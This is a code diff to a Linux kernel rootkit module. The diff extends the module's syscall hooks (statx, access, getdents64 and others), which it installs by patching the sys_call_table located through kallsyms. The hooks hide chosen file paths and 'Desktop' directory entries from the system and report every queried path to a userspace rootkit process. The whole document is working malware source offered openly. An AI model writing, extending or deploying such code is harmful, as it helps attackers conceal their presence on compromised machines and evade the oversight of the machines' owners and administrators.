@@ -2,8 +2,13 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <asm/unistd.h>
-#include <linux/interrupt.h>
 #include <linux/dirent.h>
+
+#include <linux/file.h>
+#include <linux/fdtable.h>
+#include <linux/fs.h>
+#include <linux/fs_struct.h>
+#include <linux/sched.h>
 
 #include "communicate.c"
 
@@ -157,12 +162,42 @@ asmlinkage int new_statx(const struct pt_regs *regs) {
     char __user
     *path = (char *) regs->si;
 
-    my_send_msg(rootkit_pid, path); // send data (file path)
+    if (path[0] == '/') {
+        my_send_msg(rootkit_pid, path); // send data (file path)
 
-    if (contains_prefix(trie, path)) {
-        printk(KERN_INFO
-        "hid the path from statx: %s\n", path);
-        return -1;
+        if (contains_prefix(trie, path)) {
+            printk(KERN_INFO
+            "hid the path from statx: %s\n", path);
+            return -1;
+        }
+
+    } else {
+        int dirfd = regs->di;
+
+        switch (dirfd) {
+            case AT_FDCWD: {
+                struct path pwd = current->fs->pwd;
+                path_get(&pwd);
+
+                char *buf = (char *) kmalloc(GFP_KERNEL, PATH_MAX);
+                char *cwd = d_path(&pwd, buf, 100 * sizeof(char));
+                printk(KERN_INFO
+                "cwd: %s", cwd);
+
+                struct node* s = search(get_root(trie), cwd);
+                kfree(buf);
+                if (s == NULL) break; // not found
+
+                s = search(s, "/");
+                if (s == NULL) break; // not found
+
+                s = search(s, path);
+                if (s == NULL) break; // not found
+
+                // found
+                return -1;
+            }
+        }
     }
 
     return (*((int (*)(const struct pt_regs *)) statx_hook.orig_syscall_addr))(regs);
@@ -173,15 +208,15 @@ struct hook_handle access_hook;
 
 asmlinkage int new_access(const struct pt_regs *regs) {
     char __user
-    *path = (char *) regs->si;
+    *path = (char *) regs->di;
 
     my_send_msg(rootkit_pid, path); // send data (file path)
 
-//    if (contains_prefix(trie, path)) {
-//        printk(KERN_INFO
-//        "hid the path from access: %s\n", path);
-//        return -1;
-//    }
+    if (contains_prefix(trie, path)) {
+        printk(KERN_INFO
+        "hid the path from access: %s\n", path);
+        return -1;
+    }
 
     return (*((int (*)(const struct pt_regs *)) access_hook.orig_syscall_addr))(regs);
 }
@@ -194,13 +229,45 @@ asmlinkage int new_getdents64(const struct pt_regs *regs) {
     if (ret <= 0)
         return ret;
 
+//    int fd = regs->di;
+//
+//    spin_lock(&current->files->file_lock);
+//    struct file *file = fcheck_files(current->files, fd);
+//    if (!file) {
+//        spin_unlock(&current->files->file_lock);
+//        return ret;
+//    }
+//
+//    struct path *path = &file->f_path;
+//    path_get(path);
+//    spin_unlock(&current->files->file_lock);
+//
+//    char *tmp = (char *)__get_free_page(GFP_KERNEL);
+//    if (!tmp) {
+//        path_put(path);
+//        return ret;
+//    }
+//
+//    char *pathname = d_path(path, tmp, PAGE_SIZE);
+//    path_put(path);
+//
+//    if (IS_ERR(pathname)) {
+//        free_page((unsigned long)tmp);
+//        return ret;
+//    }
+//
+//    printk(KERN_INFO "directory of getdents: %s", pathname);
+//
+//    free_page((unsigned long)tmp);
+
     struct linux_dirent64 __user
     *dirent = (struct linux_dirent64 *) regs->si;
 
     // copying the whole buffer from userspace
     struct linux_dirent64 *buffer = kzalloc(ret, GFP_KERNEL);
     if (copy_from_user(buffer, dirent, ret)) {
-        printk(KERN_INFO "can't copy buffer from user");
+        printk(KERN_INFO
+        "can't copy buffer from user");
     }
 
     unsigned long offset = 0;
@@ -211,11 +278,13 @@ asmlinkage int new_getdents64(const struct pt_regs *regs) {
         int curr_dir_sz = current_dir->d_reclen; // curr dir size
 
         if (memcmp("Desktop", current_dir->d_name, strlen("Desktop")) == 0) { // hide this entry
-            printk(KERN_INFO "removing some entry");
+            printk(KERN_INFO
+            "removing some entry");
             curr_ret -= curr_dir_sz; // decremnting this dir's size from final size
             sz_left -= curr_dir_sz;
             if (sz_left > 0)
-                memmove(current_dir, (void *) current_dir + curr_dir_sz, sz_left); // shifting down the rest of the directories, effectively "destroying" the current directory
+                memmove(current_dir, (void *) current_dir + curr_dir_sz,
+                        sz_left); // shifting down the rest of the directories, effectively "destroying" the current directory
         } else {
             offset += curr_dir_sz;
             sz_left -= curr_dir_sz;
@@ -223,11 +292,12 @@ asmlinkage int new_getdents64(const struct pt_regs *regs) {
     }
 
     // resetting the rest of the buffer
-    memset((void*) buffer + curr_ret, '\x00', ret - curr_ret);
+    memset((void *) buffer + curr_ret, '\x00', ret - curr_ret);
 
     // copying our local buffer that may have been edited back to userspace
     if (copy_to_user(dirent, buffer, ret)) {
-        printk(KERN_INFO "can't copy buffer back to user");
+        printk(KERN_INFO
+        "can't copy buffer back to user");
     }
 
     kfree(buffer);
@@ -284,43 +354,55 @@ asmlinkage int new_reboot(const struct pt_regs *regs) {
 
 
 unsigned long *sys_call_table_addr;
-static int __init
+struct {
+    struct hook_handle* handle;
+    int (*hook_func)(const struct pt_regs *);
+    int syscall_index;
+} hooks_arr[] = {
+        {&open_hook, new_open, __NR_open},
+        {&stat_hook, new_stat, __NR_stat},
+        {&lstat_hook, new_lstat, __NR_lstat},
+        {&statx_hook, new_statx, __NR_statx},
+        {&access_hook, new_access, __NR_access},
+        {&getdents64_hook, new_getdents64, __NR_getdents64},
+        {&openat_hook, new_openat, __NR_openat}
+};
 
-rootkit_init(void) {
+static int __init rootkit_init(void) {
     setup_my_channel();
-
-    // initializing kallsyms_lookup_name and pid pointers with their addresses
-//    kallsyms_lookup_addr = (void *) kallsyms;
-//    pid = pid;
 
     // getting syscall table address from kallsyms_lookup_name function
     sys_call_table_addr = (unsigned long *) (*((unsigned long (*)(const char *)) kallsyms))("sys_call_table");
 
+    for (int i = 0; i < ARRAY_SIZE(hooks_arr); i++) {
+        *hooks_arr[i].handle = hook_syscall(hooks_arr[i].hook_func, hooks_arr[i].syscall_index, sys_call_table_addr);
+    }
+
+    /*
     // hook open
 //    open_hook = hook_syscall(new_open, __NR_open, sys_call_table_addr);
 
     // hook stat
-    stat_hook = hook_syscall(new_stat, __NR_stat, sys_call_table_addr);
+//    stat_hook = hook_syscall(new_stat, __NR_stat, sys_call_table_addr);
 
     // hook lstat
-    lstat_hook = hook_syscall(new_lstat, __NR_lstat, sys_call_table_addr);
+//    lstat_hook = hook_syscall(new_lstat, __NR_lstat, sys_call_table_addr);
 
     // hook statx
-    statx_hook = hook_syscall(new_statx, __NR_statx, sys_call_table_addr);
+//    statx_hook = hook_syscall(new_statx, __NR_statx, sys_call_table_addr);
 
     // hook access
 //    access_hook = hook_syscall(new_access, __NR_access, sys_call_table_addr);
 
     // hook getdents64
-    getdents64_hook = hook_syscall(new_getdents64, __NR_getdents64, sys_call_table_addr);
+//    getdents64_hook = hook_syscall(new_getdents64, __NR_getdents64, sys_call_table_addr);
 
     // hook openat
-    openat_hook = hook_syscall(new_openat, __NR_openat, sys_call_table_addr);
+//    openat_hook = hook_syscall(new_openat, __NR_openat, sys_call_table_addr);
 
     // hook reboot
 //    reboot_hook = hook_syscall(new_reboot, __NR_reboot, sys_call_table_addr);
-
-
+*/
 
     return 0;
 }
@@ -333,30 +415,35 @@ void exit_my_module() {
         return;
     exited = true;
 
+    for (int i = 0; i < ARRAY_SIZE(hooks_arr); i++) {
+        unhook_syscall(*hooks_arr[i].handle, sys_call_table_addr);
+    }
 
+    /*
     // unhook open
 //    unhook_syscall(open_hook, sys_call_table_addr);
 
     // unhook stat
-    unhook_syscall(stat_hook, sys_call_table_addr);
+//    unhook_syscall(stat_hook, sys_call_table_addr);
 
     // unhook lstat
-    unhook_syscall(lstat_hook, sys_call_table_addr);
+//    unhook_syscall(lstat_hook, sys_call_table_addr);
 
     // unhook statx
-    unhook_syscall(statx_hook, sys_call_table_addr);
+//    unhook_syscall(statx_hook, sys_call_table_addr);
 
     // unhook access
 //    unhook_syscall(access_hook, sys_call_table_addr);
 
     // unhook getdents
-    unhook_syscall(getdents64_hook, sys_call_table_addr);
+//    unhook_syscall(getdents64_hook, sys_call_table_addr);
 
     // unhook openat
-    unhook_syscall(openat_hook, sys_call_table_addr);
+//    unhook_syscall(openat_hook, sys_call_table_addr);
 
     // unhook reboot
 //    unhook_syscall(reboot_hook, sys_call_table_addr);
+*/
 
     close_my_channel();
 
@@ -364,9 +451,7 @@ void exit_my_module() {
         free_trie(trie);
 }
 
-static void __exit
-
-rootkit_exit(void) {
+static void __exit rootkit_exit(void) {
     exit_my_module();
 }
 
